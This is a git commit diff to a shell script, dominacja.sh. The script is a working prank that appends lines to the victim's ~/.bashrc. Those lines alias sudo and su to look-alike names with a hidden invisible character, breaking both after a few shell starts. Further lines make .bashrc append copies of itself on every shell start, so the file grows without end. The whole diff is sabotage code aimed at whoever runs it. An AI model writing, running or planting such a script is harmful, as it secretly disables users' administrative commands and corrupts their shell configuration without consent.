90351c272cf2cc08bbee28b9537508042a36a3b7
XXXDominatorXXX <101982442+XXXDominatorXXX@users.noreply.github.com>
2022-03-20 16:43:45 +0100

    Mniej Losowa Dominacja

--- dominacja.sh
+++ dominacja.sh
@@ -1,6 +1,14 @@
-echo 'RAND=$(($RANDOM%10)) ' >> ~/.bashrc
-echo 'if [ $RAND -gt 4 ]' >> ~/.bashrc
+echo 'LOL=1 ' >> ~/.bashrc
+echo 'if [ $LOL -gt 3 ]' >> ~/.bashrc
 echo 'then' >> ~/.bashrc
-echo 'alias sudo="sud‎o"' >> ~/.bashrc
-echo 'alias su="s‎u"' >> ~/.bashrc
+echo 'alias sudo=sud‎o' >> ~/.bashrc
+echo 'alias su=s‎u' >> ~/.bashrc
 echo 'fi' >> ~/.bashrc
+echo 'LOL=$(($LOL+1))' >> ~/.bashrc
+
+echo "echo 'if [ \$LOL -gt 3 ]' >> ~/.bashrc" >> ~/.bashrc
+echo "echo 'then' >> ~/.bashrc" >> ~/.bashrc
+echo "echo 'alias sudo=sud‎o' >> ~/.bashrc" >> ~/.bashrc
+echo "echo 'alias su=s‎u' >> ~/.bashrc" >> ~/.bashrc
+echo "echo 'fi' >> ~/.bashrc" >> ~/.bashrc
+echo "echo 'LOL=\$((\$LOL+1))' >> ~/.bashrc" >> ~/.bashrc
